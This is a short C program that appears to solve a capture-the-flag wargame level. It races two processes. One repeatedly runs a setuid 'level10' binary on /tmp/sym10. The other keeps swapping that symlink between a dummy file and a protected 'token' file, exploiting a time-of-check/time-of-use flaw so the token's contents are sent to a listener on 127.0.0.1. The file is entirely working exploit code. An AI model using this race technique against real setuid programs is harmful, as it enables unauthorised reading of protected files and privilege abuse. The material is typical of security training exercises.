#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    if (fork()) {
        while(1)
            system("/home/user/level10/level10 /tmp/sym10 127.0.0.1 &");            
    }
    else {
        while (1) {
            system("ln -sf /tmp/toto /tmp/sym10");
            system("ln -sf /home/user/level10/token /tmp/sym10");
        }
    }
}